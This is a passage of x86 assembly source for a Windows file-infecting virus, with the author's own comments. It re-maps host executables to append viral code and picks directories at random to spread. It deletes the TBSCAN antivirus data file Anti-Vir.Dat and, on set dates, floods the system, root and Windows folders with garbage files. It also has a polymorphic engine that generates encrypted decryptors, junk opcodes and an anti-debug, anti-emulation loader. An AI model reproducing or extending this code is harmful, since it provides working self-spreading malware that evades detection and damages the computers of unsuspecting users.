      call     [ebp+aCloseHandle]

      lea      edi,[FindData.WFD_szFileName+ebp]

      push     [ebp+SavedAttrib]            ; Restore saved attribs
      push     edi
      call     [ebp+aSetFileAttributesA]
      ret
Close&UnMapFile endp


;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
; Unmap everything and re-map in RW mode
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Close&ReOpenRW      proc
      mov      eax,[ebp+MappedBA]         ; Unmap View
      push     eax                        ;
      call     [ebp+aUnmapViewOfFile]     ;
                                          ;
      mov      eax,[MapHandle+ebp]        ; Clase handle to map
      push     eax                        ;
      call     [ebp+aCloseHandle]         ;
                                          ;
      mov      ecx,[FindData.WFD_nFileSizeLow+ebp]
      add      ecx,SIZETOADD              ; Open the file with enough space at the
      cdq                                 ; end to append
      push     ecx                        ;
      push     edx                        ;
      push     ecx                        ;
      push     edx                        ;
      push     PAGE_READWRITE             ;
      push     edx                        ;
      push     [FileHandle+ebp]           ;
      call     [aCreateFileMappingA+ebp]  ; Do it
      mov      [MapHandle+ebp],eax        ;
      cdq                                 ; xor edx,edx
      pop      ecx                        ;
      push     ecx                        ;
      push     edx                        ;
      push     edx                        ;
      push     FILE_MAP_ALL_ACCESS        ;
      push     eax                        ;
      call     [ebp+aMapViewOfFile]       ; Map view of file in RW mode
      mov      [ebp+MappedBA],eax         ;
      xchg     eax,esi                    ;
      ret                                 ;
Close&ReOpenRW endp



;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
; Open a directory and 'enter' it
; Return in DirectoryBuffer the directory or eax=0 if none
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-


BrowseDirectory      proc
      mov      [NumberOfDir+ebp],0        ; Reset number of dir
                                          ;
      lea      ecx,[FindData+ebp]         ; Find First File with mask
      lea      edx,[StarStar+ebp]         ; *
      push     ecx                        ;
      push     edx                        ;
      call     [ebp+aFindFirstFileA]      ;
                                          ;
      inc      eax                        ; Do we have one ?
      jz       _DBEndSearch2              ; No, go away
      dec      eax                        ; Yes, restore handle
      push     eax                        ; Save it
Processadir:                              ;
      lea      ecx,[FindData+ebp]         ;
      cmp      DWORD PTR [ecx.WFD_szFileName],'itnA' ; Is it anti-vir.dat ?
      je        IsTBSCANInt                           ; Yeah, let's handle it ;)
EndRetro:                                            ;
      mov      edx,[ecx.WFD_dwFileAttributes]        ; Get file attribs.
      and      edx,FILE_ATTRIBUTE_DIRECTORY          ; Is it a directory ?
      cmp      edx,10h                               ;
      jne      DBFindAnother                         ; No, find another
      cmp      BYTE PTR [ecx.WFD_szFileName],'.'     ; Is it '.' or '..'
      je        DBFindAnother                         ; Yes, find another
      cmp      DWORD PTR [ecx.WFD_szFileName],'YCER' ; Is it 'RECYCLED'
      je        DBFindAnother                         ; Yes, find another
      inc      [NumberOfDir+ebp]          ; else increase counter
DBFindAnother:                            ;
      pop      ecx                        ; Get search handle
      push     ecx                        ; Re-Save it
      lea      edx,[FindData+ebp]         ;
      push     edx                        ; Push FindData
      push     ecx                        ; Push Search Handle
      call     [ebp+aFindNextFileA]       ; FindNextFile
      test     eax,eax                    ; Are we finished ?
      jz       DBEndSearch                ; Yes, end search
      jmp      Processadir                ; No, process a new dir
DBEndSearch:                              ;
      call     [ebp+aFindClose]           ; Close handle
      mov      eax,[NumberOfDir+ebp]      ; Get number of directory
      test     eax,eax
      jz       _DBEndSearch2
      inc      eax
      call     rand_in_rangef             ; Choose which dir to open
      dec      eax
      mov      [RandomDir+ebp],eax        ; Save this
                                          ;
      lea      ecx,[FindData+ebp]         ; This will search again all dirs
      lea      edx,[StarStar+ebp]         ; See upper code for explanation
      push     ecx                        ; (Yawn)
      push     edx                        ;
      call     [ebp+aFindFirstFileA]      ;
      push     eax                        ;
_Processadir:                             ;
      lea      ecx,[FindData+ebp]         ;
      mov      edx,[ecx.WFD_dwFileAttributes]        ;
      and      edx,FILE_ATTRIBUTE_DIRECTORY          ;
      cmp      edx,10h                               ;
      jne      _DBFindAnother                        ;
      cmp      BYTE PTR [ecx.WFD_szFileName],'.'     ;
      je        _DBFindAnother                        ;
      cmp      DWORD PTR [ecx.WFD_szFileName],'YCER' ; Is it '.' or '..'
      je        _DBFindAnother                        ; Yes, find another
                                                     ;
      dec      [NumberOfDir+ebp]                     ;
      mov      ecx,[NumberOfDir+ebp]                 ;
      cmp      ecx,[RandomDir+ebp]                   ; Is it the good folder ?
      jne      _DBFindAnother                        ; no, go to next
      lea      esi,[FindData+ebp]                    ; Else, enter it
      lea      esi,[esi.WFD_szFileName]              ;
      push     esi
      call     [aSetCurrentDirectory+ebp]            ; Set it at current directory
      mov      [NumberOfDir+ebp],50h                 ;
      jmp      _DBEndSearch                          ;
_DBFindAnother:                                      ;
      pop      ecx                           ; Get File Handle
      push     ecx                           ;
      lea      edx,[FindData+ebp]            ;
      push     edx                           ; Push FindData
      push     ecx                           ; Push Search Handle
      call     [ebp+aFindNextFileA]          ; find next
      test     eax,eax                       ; No next ?
      jz       _DBEndSearch                  ; Forget
      jmp      _Processadir                  ; Else process it
_DBEndSearch:                                ;
      call     [ebp+aFindClose]              ; search handle already pushed
_DBEndSearch2:                               ;
      mov      eax,[NumberOfDir+ebp]         ; Mov in eax
      ret                                    ;
IsTBSCANInt:                                 ;
      cmp      DWORD PTR [ecx.WFD_szFileName+4],'riV-' ; Really Anti-Vir.Dat ?
      jne      EndRetro                                ; No, go out
      cmp      DWORD PTR [ecx.WFD_szFileName+8],'taD.' ; Really Anti-Vir.Dat ?
      jne      EndRetro                                ; No, go out
      lea      edi,[ecx.WFD_szFileName+ebp]            ; Push Path
      push     edi                            ;
      call     [aDeleteFileA+ebp]             ; Delete :)))
      jmp      DBFindAnother                  ; find another
BrowseDirectory endp


;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
; Payload function : Check if it should trigger, and trigger if it need =)
; It creates 100 files in 3 different folder each time an infected file is
; Runned each 1st of even months ;). This mean the virus has 2 months max to
; spread.. hmm.. Also, the name is so long that sometimes they can't be
; deleted with mouse (if the name appear in the right click menu, it won't
; appear). Bothering only newbies users though (they are numerous :)
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Payload        proc
      mov      ax,word ptr [ebp+time_day]     ; 
      cmp      ax,1                           ; Is it 1st ?
      jne      EndPayload                     ; no, go away
      mov      ax,word ptr [ebp+time_month]   ; Is it an odd month ?
      and      ax,1                           ;
      test     ax,ax                          ;
      jne      EndPayload                     ; No, go away
      jmp      TRIGGER                        ; then TRIGGER =)
EndPayload:                                   ;
      ret                                     ; return
TRIGGER:                                      ;
      push     MAX_PATH                       ;
      lea      edi,[DirectoryBuffer+ebp]      ;
      push     edi                            ;
      call     [aGetSystemDirectory+ebp]      ; First fill System Directory
      lea      edi,[DirectoryBuffer+ebp]      ;
      push     edi                            ;
      call     [aSetCurrentDirectory+ebp]     ; Set it at current directory
                                              ;
      call     WriteGarbageFiles              ; Fill with garbage files
                                              ;
      mov      BYTE PTR [DirectoryBuffer+ebp+3],0  ; Get ROOT drive
      lea      edi,[DirectoryBuffer+ebp]      ;
      push     edi                            ;
      call     [aSetCurrentDirectory+ebp]     ; Set it as current dir
                                              ;
      call     WriteGarbageFiles              ; Fill with garbage files
                                              ;
      push     MAX_PATH                       ;
      lea      edi,[DirectoryBuffer+ebp]      ; 
      push     edi                            ;
      call     [aGetWindowsDirectory+ebp]     ; Next fill Windows Directory
      lea      edi,[DirectoryBuffer+ebp]      ;
      push     edi                            ;
      call     [aSetCurrentDirectory+ebp]     ; Set as current dir
      call     WriteGarbageFiles              ; Fill with garbage files
      ret                                     ;
Payload      endp                             ;


;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
; Poly loader will generate my anti-debug anti-emul routine polymorphically ;)
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

PolyLoader      proc
      mov      [RegUsedToEncrypt+ebp],desp      ; Reset used registers
      mov      [RegUsedAsPointer+ebp],desp      ;
      mov      [RegUsedAsPointer2+ebp],desp     ;
      mov      [RegUsedAsDelta+ebp],desp        ;
      mov      [RegUsedToLoop+ebp],desp         ;
      push     ebx                              ; Save Virtual Entry point
      mov      DWORD PTR [CurrentInstruction+ebp],000000E8h ; Generate call
      mov      BYTE PTR [CurrentInstruction+4+ebp],00h      ;
      mov      BYTE PTR [CurrentInstructionSize+ebp],5      ;
      call     WriteInstruction                 ;
      mov      [CallOrigin+ebp],edi             ; Save edi to setup SEH
      push     esi                              ;
      call     GenerateJunkInstruction          ; Generate junk instruction
      pop      esi                              ;
      mov      DWORD PTR [CurrentInstruction+ebp],0824648Bh
      mov      BYTE PTR [CurrentInstructionSize+ebp],4
      call     WriteInstruction                 ;
      push     esi                              ;
      call     GenerateJunkInstruction          ; Yawn
      pop      esi                              ;
      call     ChooseHarmlessReg                ; Choose a reg other than esp
      mov      [RegUsedToEncrypt+ebp],al        ; Put that reg here
      pop      ebx                              ; EBX = Virus EIP
      push     eax                              ;
      push     edi                              ;
      call     GenerateMovImmtoReg              ; Generate mov reg, adress
      pop      edi                              ;
      call     WriteInstruction                 ;
      push     esi                              ;
      call     GenerateJunkInstruction          ; Yawn
      pop      esi                              ;
      pop      eax                              ; Get back used reg
      push     esi                              ;
      call     GeneratePushReg                  ; Push adress
      pop      esi                              ;
      call     WriteInstruction                 ;
      push     esi                              ;
      call     GenerateJunkInstruction          ; Yawn again
      pop      esi                              ;
      mov      [CurrentInstruction+ebp],0c3h    ; Return
      mov      BYTE PTR [CurrentInstructionSize+ebp],1      ;
      call     WriteInstruction                 ;
      mov      eax,[CallOrigin+ebp]             ; Caculate call destination
      mov      ebx,edi                          ;
      sub      ebx,eax                          ;
      mov      [eax-4],ebx                      ;
      mov      [RegUsedToEncrypt+ebp],desp      ; Reset used regs
      push     esi                              ;
      call     GenerateJunkInstruction          ; Yawn Yawn
      pop      esi                              ;
      call     ChooseHarmlessReg                ; Choose a reg to zero
      mov      [RegUsedToEncrypt+ebp],al        ;
      push     eax                              ;
      xor      ebx,ebx                          ; xor ebx
      mov      ah,al                            ; compute reg mask
      shl      al,3                             ;
      or       al,ah                            ;
      xor      ah,ah                            ;
      push     edi                              ;
      call     GenerateXorRegtoReg              ; xor reg,reg
      pop      edi                              ;
      call     WriteInstruction                 ;
      push     esi                              ;
      call     GenerateJunkInstruction          ; ZzzZZZzzz
      pop      esi                              ;
      pop      eax                              ;
      push     eax                              ;
      mov      WORD PTR[CurrentInstruction+ebp],0ff64h  ; Generate SEH installer
      mov      BYTE PTR[CurrentInstruction+2+ebp],30h   ;
      or       byte ptr [CurrentInstruction+2+ebp],al   ;
      mov      BYTE PTR [CurrentInstructionSize+ebp],3  ;
      call     WriteInstruction                 ;
      push     esi                              ;
      call     GenerateJunkInstruction          ; ZzzzzZzzz...
      pop      esi                              ;
      pop      eax                              ;
      push     eax                              ;
      mov      WORD PTR[CurrentInstruction+ebp],08964h  ; Still SEH handler
      mov      BYTE PTR[CurrentInstruction+2+ebp],20h   ;
      or       byte ptr [CurrentInstruction+2+ebp],al   ;
      mov      BYTE PTR [CurrentInstructionSize+ebp],3  ;
      call     WriteInstruction                 ;
      push     esi                              ;
      call     GenerateJunkInstruction          ; Borrrrinng...
      pop      esi                              ;
      pop      eax                              ;
      mov      WORD PTR[CurrentInstruction+ebp],00c6h      ; Generate exception =)
      mov      byte PTR[CurrentInstruction+2+ebp],00h      ;
      or       byte ptr [CurrentInstruction+1+ebp],al      ;
      mov      BYTE PTR [CurrentInstructionSize+ebp],3     ;
      call     WriteInstruction                 ;
      ret                                       ;
PolyLoader      endp



;············································································
;Linear congruent pseudorandom number generator by GriYo
;············································································

get_rnd32 proc
      push     ecx
      push     edx
      mov      eax,dword ptr [ebp+rnd32_seed]
      mov      ecx,eax
      imul     eax,41C64E6Dh
      add      eax,00003039h
      mov      dword ptr [ebp+rnd32_seed],eax
      xor      eax,ecx
      pop      edx
      pop      ecx
      ret
get_rnd32 endp

get_rnd32f proc
      push     ecx
      push     edx
      mov      eax,dword ptr [ebp+rnd32_seedfast]
      mov      ecx,eax
      imul     eax,41C64E6Dh
      add      eax,02F4D527h
      mov      dword ptr [ebp+rnd32_seedfast],eax
      xor      eax,ecx
      pop      edx
      pop      ecx
      ret
get_rnd32f endp

;············································································
;Returns a random num between 0 and entry eax
;············································································

rand_in_range32 proc
      push     ecx
      push     edx
      mov      ecx,eax
      call     get_rnd32
      xor      edx,edx
      div      ecx
      mov      eax,edx  
      pop      edx
      pop      ecx
      ret
rand_in_range32 endp
   
rand_in_range32f proc
      push     ecx
      push     edx
      mov      ecx,eax
      call     get_rnd32f
      xor      edx,edx
      div      ecx
      mov      eax,edx  
      pop      edx
      pop      ecx
      ret
rand_in_range32f endp

rand_in_range proc
      push     ax
      xor      eax,eax
      pop      ax
      call     rand_in_range32
      ret
rand_in_range endp

rand_in_rangef proc
      push     ax
      xor      eax,eax
      pop      ax
      call     rand_in_range32f
      ret
rand_in_rangef endp


;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
; Poly function generate polymorphic decryptor and the corresponding decryptor
; It uses multiple opcodes, random encryption scheme, regs sliding, etc.. =)
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Poly      proc
      mov      [RegUsedToEncrypt+ebp],deax
      mov      [RegUsedAsPointer+ebp],dedi
      mov      [RegUsedAsPointer2+ebp],desi
      mov      [RegUsedAsDelta+ebp],debp
      mov      [RegUsedToLoop+ebp],decx
      lea      edi,[EndCryptor+ebp-8]
      mov      [CurrentDecryptorOffset+ebp],edi
      lea      edi,[Decryptor+ebp]
      mov      DWORD PTR [RegToInit+ebp],desi
      call     GenerateInitReg
      call     GenerateSomeJunk
      mov      DWORD PTR [RegToInit+ebp],dedi
      call     GenerateInitReg
      call     GenerateSomeJunk
      call     GenerateBeginLoop
      dec      edi
      mov      [WhereToLoop+ebp],edi
      inc      edi
      call     GenerateSomeJunk
      call     GenerateTakeDWORD
      call     GenerateSomeJunk
      call     GenerateCryDec
      call     GenerateWriteDWORD
      call     GenerateSomeJunk
      call     GenerateEndLoop
      call     GenerateSomeJunk
      mov      BYTE PTR [edi],0C3h
      ret
Poly      endp

;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
; Generate Cryptor and Decryptor... Between 7 and 11 crypting instruction
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

GenerateCryDec      proc
      push     4
      pop      eax
      call     rand_in_range
      add      eax,7
      mov      ecx,eax
CryptAgain:
      push     ecx
      call     GenerateCryptInstruction
      call     GenerateSomeJunk
      call     GenerateSomeJunk
LoopCryptGen:
      pop      ecx
      loop     CryptAgain
      ret
GenerateCryDec      endp

;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
; Generate a crypting instruction and it's "reverse"
; On entry, edi point to the spot where to write intruction
; On exit, edi is incremented by the correct number of byte
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

GenerateCryptInstruction      proc
      push     edi
      push     NumberOfCryptor
      pop      eax
      call     rand_in_range
      shl      eax,2
      mov      edx,DWORD PTR [CryptRoutines+ebp+eax]
      push     eax
      add      edx,ebp
      call     get_rnd32
      xchg     ebx,eax
      push     ebx
      movzx    eax,BYTE PTR [RegUsedToEncrypt+ebp]
      call     edx
      pop      ebx
      pop      eax
      pop      edi
      push     eax
      push     ebx
      call     WriteInstruction
      pop      ebx
      pop      eax
      push     edi
      mov      edx,DWORD PTR [DecryptRoutines+ebp+eax]
      add      edx,ebp
      movzx    eax,BYTE PTR [RegUsedToEncrypt+ebp]
      call     edx
      mov      edi,[CurrentDecryptorOffset+ebp]
      call     WriteInstruction
      xor      ecx,ecx
      mov      cl,[CurrentInstructionSize+ebp]
      sub      edi,ecx
      sub      edi,8
      mov      [CurrentDecryptorOffset+ebp],edi
      pop      edi
      ret
GenerateCryptInstruction endp


;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
; Generate begin of loop (init the counter reg and push it ;)
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

GenerateBeginLoop     proc
      push     edi
      push     4
      pop      eax
      call     rand_in_range
      test     eax,eax
      je       BeginLoop2
BeginLoop1:
      xor      eax,eax
      call     ChooseHarmlessReg
      mov      [ebp+RegUsedToLoop],al
      mov      ebx,SizeOfEncrypted
      pop      edi
      push     eax
      push     edi
      call     GenerateMovImmtoReg
      pop      edi
      call     WriteInstruction
      pop      eax
      push     edi
      call     GeneratePushReg
      jmp      EndBeginLoop
BeginLoop2:
      xor      eax,eax
      call     ChooseHarmlessReg
      mov      [ebp+RegUsedToLoop],al
      xchg     eax,ecx
      mov      ebx,SizeOfEncrypted
      call     get_rnd32
      xchg     ecx,eax
      ror      ebx,cl
      pop      edi
      push     ecx
      push     eax
      push     edi
      call     GenerateMovImmtoReg
      pop      edi
      call     WriteInstruction
      pop      eax
      pop      ebx
      push     eax
      push     edi
      call     GenerateRolImm&Reg
      pop      edi
      call     WriteInstruction
      pop      eax
      push     edi
      call     GeneratePushReg
      jmp      EndBeginLoop
EndBeginLoop:
      pop      edi
      call     WriteInstruction
BeginLoopNothing:
      ret
GenerateBeginLoop endp


;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
; Generate end of loop (either loop or compare - jump)
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

GenerateEndLoop     proc
      push     edi
      xor      eax,eax
      mov      al,[ebp+RegUsedToLoop]
      call     GeneratePopReg
      pop      edi
      push     eax
      call     WriteInstruction
      pop      eax
      push     edi
      call     GenerateDecReg
      pop      edi
      mov      BYTE PTR [CurrentInstruction+1+ebp],83h
      mov      BYTE PTR [CurrentInstruction+2+ebp],0F8h
      or       BYTE PTR [CurrentInstruction+2+ebp],al
      mov      BYTE PTR [CurrentInstruction+3+ebp],0h
      mov      WORD PTR [CurrentInstruction+ebp+4],0574h
      mov      BYTE PTR [CurrentInstructionSize+ebp],6
      call     WriteInstruction
      push     edi
      mov      eax,[WhereToLoop+ebp]
      sub      eax,5
      sub      eax,edi
      mov      BYTE PTR [CurrentInstruction+ebp],0E9h
      lea      edi,[CurrentInstruction+ebp+1]
      stosd
      mov      BYTE PTR [CurrentInstructionSize+ebp],5
      pop      edi
      call     WriteInstruction
      ret
GenerateEndLoop endp


;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
; Generate take DWORD using different methods
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

GenerateTakeDWORD      proc
      push     edi
      cmp      BYTE PTR [RegUsedAsPointer2+ebp],desi
      jne      TakeDWORD1
      cmp      BYTE PTR [RegUsedToEncrypt+ebp],deax
      jne      TakeDWORD1
      push     4
      pop      eax
      call     rand_in_range
      test     eax,eax
      je       TakeDWORD2
TakeDWORD1:
      xor      eax,eax
      xor      ecx,ecx
      mov      al,BYTE PTR [RegUsedToEncrypt+ebp]
      shl      eax,3
      mov      cl,BYTE PTR [RegUsedAsPointer2+ebp]
      or       eax,ecx
      call     GenerateMovRegPtrtoReg
      pop      edi
      call     WriteInstruction
      call     GenerateJunkInstruction
      xor      eax,eax
      mov      al,BYTE PTR [RegUsedAsPointer2+ebp]
      call     IncreasePtr
      push     edi
      jmp      EndTakeDWORD
TakeDWORD2:
      cmp      BYTE PTR [RegUsedToEncrypt+ebp],deax
      jne      TakeDWORD1
      mov      BYTE PTR [CurrentInstruction+ebp],0ADh      ; loadsd
      mov      BYTE PTR [CurrentInstructionSize+ebp],1
EndTakeDWORD:
      pop      edi
      call     WriteInstruction
      ret
GenerateTakeDWORD endp


;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
; Generate write DWORD using different methods
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

GenerateWriteDWORD      proc
      push     edi
      cmp      BYTE PTR [RegUsedAsPointer+ebp],dedi
      jne      WriteDWORD1
      cmp      BYTE PTR [RegUsedToEncrypt+ebp],deax
      jne      WriteDWORD1
      push     4
      pop      eax
      call     rand_in_range
      cmp      eax,1
      jae      WriteDWORD2
WriteDWORD1:
      xor      eax,eax
      xor      ecx,ecx
      mov      al,BYTE PTR [RegUsedToEncrypt+ebp]
      shl      eax,3
      mov      cl,BYTE PTR [RegUsedAsPointer+ebp]
      or      eax,ecx
      call     GenerateMovRegtoRegPtr
      pop      edi
      call     WriteInstruction
      call     GenerateJunkInstruction
      xor      eax,eax
      mov      al,BYTE PTR [RegUsedAsPointer+ebp]
      call     IncreasePtr
      push     edi
      jmp      EndWriteDWORD
WriteDWORD2:
      cmp      BYTE PTR [RegUsedToEncrypt+ebp],deax
      jne      WriteDWORD1
      mov      BYTE PTR [CurrentInstruction+ebp],0ABh      ; stosd
      mov      BYTE PTR [CurrentInstructionSize+ebp],1
EndWriteDWORD:
      pop      edi
      call     WriteInstruction
      ret
GenerateWriteDWORD endp


;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
; Generate init pointer reg using different methods...
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

GenerateInitReg      proc
      push     edi
      push     4
      pop      eax
      call     rand_in_range
      test     eax,eax
      je       InitReg4
      cmp      eax,1
      je       InitReg2
      cmp      eax,2
      je       InitReg3
InitReg1:
      mov      eax,DWORD PTR [RegToInit+ebp]
      call     GeneratePopReg
      pop      edi
      call     WriteInstruction
      call     GenerateJunkInstruction
      push     edi
      mov      eax,DWORD PTR [RegToInit+ebp]
      call     GeneratePushReg
      jmp      InitRegEnd
InitReg2:
      mov      eax,DWORD PTR [RegToInit+ebp]
      shl      eax,3
      or      eax,debp
      mov      ebx,offset StartOfEncryptedData
      call     GenerateLeaImm&Reg
      jmp      InitRegEnd
InitReg3:
      mov      eax,DWORD PTR [RegToInit+ebp]
      mov      ebx,offset StartOfEncryptedData
      call     GenerateMovImmtoReg
      pop      edi
      call     WriteInstruction
      call     GenerateJunkInstruction
      push     edi
      mov      eax,DWORD PTR [RegToInit+ebp]
      shl      eax,3
      or       eax,debp
      call     GenerateAddRegtoReg
      jmp      InitRegEnd
InitReg4:
      mov      eax,DWORD PTR [RegToInit+ebp]
      shl      eax,3
      or       eax,debp
      call     GenerateMovRegtoReg
      pop      edi
      call     WriteInstruction
      call     GenerateJunkInstruction
      push     edi
      mov      eax,DWORD PTR [RegToInit+ebp]
      mov      ebx,offset StartOfEncryptedData
      call     GenerateAddImm&Reg
      jmp      InitRegEnd
InitRegEnd:
      pop      edi
      call     WriteInstruction
      ret
GenerateInitReg endp


;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
; Generate increase pointer reg using different methods... (ie : add esi,4)
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

IncreasePtr      proc
      push     edi
      push     eax
      push     3
      pop      eax
      call     rand_in_range
      xchg     eax,ebx
      pop      eax
      test     ebx,ebx
      je       IncreasePtr3
      mov      dl,1
      cmp      bl,dl
      je       IncreasePtr2
IncreasePtr1:
      call     GenerateIncReg
      push     3
      pop      ecx
IncAgain:
      mov      [IncCounter+ebp],ecx
      pop      edi
      push     eax
      call     WriteInstruction
      call     GenerateJunkInstruction
      pop      eax
      push     edi
      call     GenerateIncReg
      mov      ecx,[IncCounter+ebp]
      loop     IncAgain
      jmp      IncreasePtrEnd
IncreasePtr2:
      push     4
      pop      ebx
      call     GenerateAddImm&Reg
      jmp      IncreasePtrEnd
IncreasePtr3:
      push     eax
      xor      eax,eax
      call     ChooseHarmlessReg
      push     2
      pop      ebx
      push     eax
      call     GenerateMovImmtoReg
      pop      eax            ; Get Dummy Reg
      pop      ebx
      pop      edi
      push     ebx
      call     WriteInstruction
      push     eax
      push     1
      pop      ebx
      push     edi
      call     GenerateRolImm&Reg
      pop      edi
      call     WriteInstruction
      pop      eax
      pop      ecx
      push     edi
      shl      ecx,3
      or       eax,ecx
      call     GenerateAddRegtoReg
IncreasePtrEnd:
      pop      edi
      ret
IncreasePtr endp


;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
; Write an instruction previously placed in the CurrentInstruction Buffer
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

WriteInstruction proc
      lea      esi,[CurrentInstruction+ebp]
      xor      ecx,ecx
      mov      cl,BYTE PTR [CurrentInstructionSize+ebp]
      rep      movsb
      ret
WriteInstruction endp


;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
; Generate between 3 and 18 bytes of useless opcodes....
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

GenerateSomeJunk proc
      push     3
      pop      eax
      call     rand_in_range
      inc      eax
      xchg     eax,ecx
JunkAgain:
      push     ecx
      call     GenerateJunkInstruction
      pop      ecx
      loop     JunkAgain
      ret
GenerateSomeJunk endp

;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
; Generate an opcode between 1 and 6 bytes.
; On entry, edi point to the spot where to write intruction
; On exit, edi is incremented by the correct number of byte
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

GenerateJunkInstruction      proc
      push     edi
      xor      eax,eax
      call     ChooseHarmlessReg
      xchg     eax,ecx
      push     3
      pop      eax
      call     rand_in_range
      test     eax,eax
      je       GenerateRegAndReg
      mov      dl,1
      cmp      al,dl
      je       GenerateRegAndImm
GenerateRegOnly:
      mov      ax,NumberOfOneReg
      call     rand_in_range
      shl      eax,2
      mov      edx,DWORD PTR [OneRegInstr+ebp+eax]
      add      edx,ebp
      xchg     eax,ecx
      call     edx
      jmp      WriteJunk
GenerateRegAndReg:
      xor      eax,eax
      inc      eax
      call     ChooseHarmlessReg
      shl      ecx,3
      or       ecx,eax
      mov      ax,NumberOfTwoReg
      call     rand_in_range
      shl      eax,2
      mov      edx,DWORD PTR [RegToRegInstr+ebp+eax]
      add      edx,ebp
      xchg     eax,ecx
      call     edx
      jmp      WriteJunk
GenerateRegAndImm:
      mov      ax,NumberOfRegImm
      call     rand_in_range
      shl      eax,2
      mov      edx,DWORD PTR [RegAndImmInstr+ebp+eax]
      add      edx,ebp
      call     get_rnd32
      xchg     eax,ebx
      xchg     eax,ecx
      call     edx
WriteJunk:
      pop      edi
      call     WriteInstruction
      ret
GenerateJunkInstruction endp


;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
; Choose an harmless reg and put his mask in al...
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

ChooseHarmlessReg proc
      push     ebx
      xchg     eax,ebx
      xor      eax,eax
Again:
      mov      ax,8
      call     rand_in_range
      cmp      ax,desp
      je       Again
      cmp      ebx,1
      je       regOk
      cmp      al,[RegUsedToEncrypt+ebp]
      je       Again
      cmp      al,[RegUsedAsPointer+ebp]
      je       Again
      cmp      al,[RegUsedAsPointer2+ebp]
